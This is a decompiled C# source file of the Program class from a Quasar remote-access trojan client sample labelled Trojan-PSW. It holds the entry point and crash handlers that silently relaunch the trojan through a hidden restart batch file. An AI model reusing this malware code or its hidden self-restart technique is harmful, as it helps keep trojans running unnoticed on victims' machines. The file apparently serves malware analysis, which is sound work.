// Decompiled with JetBrains decompiler
// Type: Quasar.Client.Program
// Assembly: Client, Version=1.4.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 73C3C7FC-0EA2-48C4-8CEF-33A8CFDA287C
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2022.03\Trojan-PSW.MSIL.Agent.anew-0b84e664c8b592aa0220d52841629b2accb41f1f624720331000ab5f2f0ed628.exe

using Quasar.Client.IO;
using System;
using System.Diagnostics;
using System.Net;
using System.Threading;
using System.Windows.Forms;

namespace Quasar.Client
{
  internal static class Program
  {
    [STAThread]
    private static void Main()
    {
      ServicePointManager.SecurityProtocol = SecurityProtocolType.Tls12;
      Application.SetUnhandledExceptionMode(UnhandledExceptionMode.CatchException);
      Application.ThreadException += new ThreadExceptionEventHandler(Program.HandleThreadException);
      AppDomain.CurrentDomain.UnhandledException += new UnhandledExceptionEventHandler(Program.HandleUnhandledException);
      Application.EnableVisualStyles();
      Application.SetCompatibleTextRenderingDefault(false);
      Application.Run((Form) new QuasarApplication());
    }

    private static void HandleThreadException(object sender, ThreadExceptionEventArgs e)
    {
      try
      {
        string restartBatch = BatchFile.CreateRestartBatch(Application.ExecutablePath);
        Process.Start(new ProcessStartInfo()
        {
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = true,
          FileName = restartBatch
        });
      }
      catch (Exception ex)
      {
      }
      finally
      {
        Environment.Exit(0);
      }
    }

    private static void HandleUnhandledException(object sender, UnhandledExceptionEventArgs e)
    {
      if (!e.IsTerminating)
        return;
      try
      {
        string restartBatch = BatchFile.CreateRestartBatch(Application.ExecutablePath);
        Process.Start(new ProcessStartInfo()
        {
          WindowStyle = ProcessWindowStyle.Hidden,
          UseShellExecute = true,
          FileName = restartBatch
        });
      }
      catch (Exception ex)
      {
      }
      finally
      {
        Environment.Exit(0);
      }
    }
  }
}
